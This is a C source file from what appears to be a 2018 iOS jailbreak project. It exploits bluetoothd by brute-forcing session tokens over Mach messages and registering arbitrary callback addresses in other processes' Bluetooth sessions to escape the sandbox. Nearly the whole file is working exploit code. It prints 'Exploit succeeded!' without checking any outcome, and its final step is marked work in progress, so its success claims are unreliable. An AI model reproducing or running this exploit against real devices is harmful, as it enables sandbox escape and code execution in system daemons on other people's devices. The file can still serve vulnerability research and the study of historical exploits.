//
//  unsandbox.c
//  jailbreak112
//
//  Created by Sem Voigtländer on 5/8/18.
//  Copyright © 2018 Jailed Inc. All rights reserved.
//

#include "unsandbox.h"
#include "lorgnette.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <xpc/xpc.h>
typedef unsigned int mach_msg_return_value;
extern kern_return_t bootstrap_look_up(mach_port_t bs, const char *service_name, mach_port_t *service);
/*
 If you get a compile error, run this in terminal (assuming your xcode is in /Applications):
 
 export XCODE_BASE_DIR="/Applications/Xcode.app/Contents/Developer/Platforms/"
 export XCODE_MAC_SDK="$XCODE_BASE_DIR/MacOSX.platform/Developer/SDKs/MacOSX.sdk/"
 export XCODE_IOS_SDK="$XCODE_BASE_DIR/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk/"
 sudo cp -r $XCODE_MAC_SDK/usr/include/launch.h $XCODE_IOS_SDK/usr/include/launch.h
 sudo cp -r $XCODE_MAC_SDK/usr/include/xpc/ $XCODE_IOS_SDK/usr/include/xpc
 sudo cp -r $XCODE_MAC_SDK/usr/include/net/bpf.h $XCODE_IOS_SDK/usr/include/net/bpf.h
 
 */

#include <mach/mach.h>
#include <mach-o/dyld.h>
#define MAXIMUM_NUMBER_OF_PORTS_AVAILABLE 0xffff

#define BLUETOOTHD_CONST 0xFA300
#define BLUETOOTHD_WRONG_TOKEN 7

#define BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_RECV_SIZE 0x44
#define BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_SEND_SIZE 0x48
#define BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_OPTIONS 0x113
#define BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_MSG_ID 3
#define BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_TIMEOUT 0x1000
#define BLUETOOTHD_MIG_SERVER_NAME "com.apple.server.bluetooth"

#define ADD_CALLBACK_MACH_MSG_OUT_RETURN_VALUE_OFFSET 0x20
#define ADD_CALLBACK_MACH_MSG_IN_SESSION_TOKEN_OFFSET 0x20
#define ADD_CALLBACK_MACH_MSG_IN_CALLBACK_ADDRESS_OFFSET 0x28
#define ADD_CALLBACK_MACH_MSG_IN_CALLBACK_DATA 0x40
#define NSLog printf

mach_port_t get_service_port(char *service_name)
{
    kern_return_t ret = KERN_SUCCESS;
    mach_port_t service_port = MACH_PORT_NULL;
    mach_port_t bs = MACH_PORT_NULL;
    
    
    ret = task_get_bootstrap_port(mach_task_self(), &bs);
    
    ret = bootstrap_look_up(bootstrap_port, service_name, &service_port);
    if (ret)
    {
        NSLog("Couldn't find port for %s\n",service_name);
        return MACH_PORT_NULL;
    }
    
    NSLog("Got port: %x\n", service_port);
    
    mach_port_deallocate(mach_task_self(), bs);
    return service_port;
}


mach_msg_return_value BTLocalDevice_add_callback(mach_port_t bluetoothd_port, mach_port_t session_token, void* callback_address, long additional_data) {
//Construct a the MACH_MESSAGE for bluetoothd interaction
mach_port_t receive_port = MACH_PORT_NULL;
mach_msg_header_t * message = NULL;
char *data = NULL;
kern_return_t ret = KERN_SUCCESS;
mach_msg_return_value return_value = 0;
mach_msg_id_t msgh_id = BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_MSG_ID;
mach_msg_size_t recv_size = BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_RECV_SIZE;
mach_msg_size_t send_size = BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_SEND_SIZE;
mach_msg_option_t options = BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_OPTIONS;
mach_msg_size_t msg_size = MAX(recv_size, send_size);

//We need a port with with receive rights for responses from bluetoothd
ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &receive_port);
if ( ret != KERN_SUCCESS)
{
    return_value = -3;
    NSLog("Failed to allocate port ret=%x\n", ret);
    NSLog("mach_error_string: mach_error_string %s\n", mach_error_string(ret));
    goto cleanup;
}

//We need a port with send rights for requests to bluetoothd
ret = mach_port_insert_right(mach_task_self(), receive_port, receive_port, MACH_MSG_TYPE_MAKE_SEND);
if ( ret != KERN_SUCCESS)
{
    return_value = -3;
    NSLog("Failed to insert port right ret=%x\n", ret);
    NSLog("mach_error_string: mach_error_string %s\n", mach_error_string(ret));
    goto cleanup;
}

message = malloc(msg_size);
data = (char *)message;
memset(message, 0, msg_size);
*((mach_port_t *)(data+ADD_CALLBACK_MACH_MSG_IN_SESSION_TOKEN_OFFSET)) = session_token;
*((void **)(data+ADD_CALLBACK_MACH_MSG_IN_CALLBACK_ADDRESS_OFFSET)) = callback_address;
*((long *)(data+ADD_CALLBACK_MACH_MSG_IN_CALLBACK_DATA)) = additional_data;
message->msgh_bits = 0x1513 ;

message->msgh_remote_port = bluetoothd_port; /* Request port */
message->msgh_local_port = receive_port; /* Reply port */
message->msgh_size =  send_size;    /* Message size */
message->msgh_reserved = 0;
message->msgh_id = BLUETOOTHD_CONST + msgh_id;

//Send our message to bluetoothd
ret = mach_msg(message,              /* The header */
               options, /* Flags */
               send_size,              /* Send size */
               recv_size,              /* Max receive Size */
               receive_port,                 /* Receive port */
               BLUETOOTHD_MACH_MESSAGE_ADD_CALLBACK_TIMEOUT,        /* No timeout */
               MACH_PORT_NULL);              /* No notification */

//Make sure we were able to actually send our message
if(MACH_MSG_SUCCESS == ret)
{
    return_value = *(mach_msg_return_t *) (((char *) message) + ADD_CALLBACK_MACH_MSG_OUT_RETURN_VALUE_OFFSET);
    if (return_value != BLUETOOTHD_WRONG_TOKEN) {
        NSLog("Sent message id %d with token %x, returned: %x\n", msgh_id, session_token, return_value);
    }
} else if (MACH_RCV_INVALID_NAME == ret) //Check if something went wrong sending our message
{
    NSLog("mach_error_string: mach_error_string %s\n", mach_error_string(ret));
    NSLog("mach_error_int: ret=%x\n", ret);
    NSLog("mach_remote_port: %x\n", message->msgh_remote_port);
    return_value = -2;
}
else { //In all other cases something weird has happened and we failed.
    NSLog("mach_error_string: mach_error_string %s\n", mach_error_string(ret));
    NSLog("mach_error_int: ret=%x\n", ret);
    NSLog("mach_remote_port: %x\n", message->msgh_remote_port);
    return_value = -1;
}


cleanup:
if(MACH_PORT_NULL != receive_port)
{
    mach_port_destroy(mach_task_self(), receive_port); //destroy the machport we have for receiving messages
}

if (NULL != message) {
    free(message); //free our message, we don't need it anymore
}
return return_value;
}

mach_port_t tasklist[502];


bool unsandbox() {
    void* address = 0;
    long value = 0;
    
    address = (void*)lorgnette_lookup(mach_task_self(), "abort"); //For the PoC to kill all processes, trigger a log
    value = 0x13371337;
    

    int ports_found[MAXIMUM_NUMBER_OF_PORTS_AVAILABLE] = {0}; //There are 0xffff (65535) maximum number of ports available, so we create a list of ports with that size
    int number_of_ports_found = 0;
    
    mach_port_t bluetoothd_port = get_service_port(BLUETOOTHD_MIG_SERVER_NAME); //First we need to know what the port of bluetoothd is so we can communicate with the daemon
    
    if (MACH_PORT_NULL == bluetoothd_port) //Make we were able to get a port, else our exploit obviously failed because we can't communicate with bluetoothd
    {
        NSLog("Couldn't have bluetoothd port\n");
        return false;
    }
    
    NSLog("Starting to look for session tokens\n");
    for (int i = 0; i <= MAXIMUM_NUMBER_OF_PORTS_AVAILABLE; i++) {
        int id = 0;
        id = (i << 16) + 1;
        int result_code = BTLocalDevice_add_callback(bluetoothd_port, id, NULL, 0);
        if(result_code != BLUETOOTHD_WRONG_TOKEN && result_code != -1)
        {
            NSLog("Found port: %x\n", id);
            ports_found[number_of_ports_found] = id;
            number_of_ports_found ++;
        }
        
        
        id = (i << 16) + 2;
        result_code = BTLocalDevice_add_callback(bluetoothd_port, id, NULL, 0);
        if(result_code != BLUETOOTHD_WRONG_TOKEN && result_code != -1)
        {
            NSLog("Found port: %x\n", id);
            ports_found[number_of_ports_found] = id;
            number_of_ports_found ++;
        }
        
        
        id = (i << 16);
        result_code = BTLocalDevice_add_callback(bluetoothd_port, id, NULL, 0);
        if(result_code != BLUETOOTHD_WRONG_TOKEN && result_code != -1)
        {
            NSLog("Found port: %x\n", id);
            ports_found[number_of_ports_found] = id;
            number_of_ports_found ++;
        }
        
    }
    
    for (int i = number_of_ports_found-1; i>=0; i--) {
        // WORK IN PROGRESS
        NSLog("Adding callback: Port=%x address=%x value=%x\n", ports_found[i], (unsigned int)address, (unsigned int)value);
      BTLocalDevice_add_callback(bluetoothd_port, ports_found[i], address, value);
    }
    NSLog("Exploit succeeded!\n");
    return true;
}
